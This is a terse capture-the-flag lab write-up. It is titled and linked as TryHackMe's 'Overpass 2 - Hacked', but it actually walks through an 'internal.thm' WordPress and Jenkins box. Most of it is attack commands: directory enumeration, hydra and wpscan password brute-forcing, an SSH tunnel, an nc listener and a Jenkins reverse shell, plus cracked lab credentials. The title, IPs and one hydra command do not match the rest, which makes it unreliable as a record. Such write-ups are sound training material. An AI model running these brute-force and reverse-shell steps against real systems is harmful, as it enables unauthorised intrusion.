# Writeup for [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked)

```
set -gx IP 10.10.41.11
```


## Task 1: Pre-engagement Briefing

* read the docs!!


## Task 2: Deploy and Engage the Client Environment

* run gobuster to find routes `gobuster dir --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --url $IP`
  * found `/blog`, `/wordpress`, `/phpmyadmin`, `/javascript`
* run gobuster on found blog route `gobuster dir --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --url $IP/blog`
  * found `/wp-content`, `/wp-includes`, `/wp-admin`
* start trying to crack wordpress password `hydra -L /usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt -P /usr/share/wordlists/rockyou.txt.gz $IP http-post-form "/blog/login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.185.54%2Fblog%2Fwp-admin%2F&testcookie=1(:Access denied"`
* start trying to crack phpmyadmin password `hydra -L /usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt -P /usr/share/wordlists/rockyou.txt.gz $IP http-post-form "/phpmyadmin/login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.185.54%2Fblog%2Fwp-admin%2F&testcookie=1(:Access denied"`
* found possible sqli at `http://192.168.1.45/blog/?p=1`
* found possible sqli on `http://10.10.185.54/blog/?s=test`
* found wordpress version: **5.4.2**
* found possible XSS on `http://10.10.185.54/blog/index.php/2020/08/03/hello-world/`
* using wpscan to perform password attack `wpscan --url $IP/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50`
  * found combination `Username: admin, Password: my2boys`
* add `internal.thm` to /etc/hosts
* found database credentials in `wordpress-config.php`
* login to `internal.thm/phpmyadmin` with found creds
* found password file in `/opt` folder
* ssh with found credentials (aubreanna:bubb13guM!@#123)
* found jenkins service running on port 8080
* redirect service to localhost `ssh -L 8080:localhost:8080 aubreanna@internal.thm`
* started bruteforce `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 localhost http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username" -I`
* found password for user admin **spongebob**
* started nc listener `nc -lnvp 4444`
* created java reverse shell and executed in script console
* search for note `ls /opt` && `cat /opt/note.txt`
* found root credentials: **root:tr0ub13guM!@#123**
* ssh with root `ssh root@$IP`
* found root.txt `cat /root/root.txt`
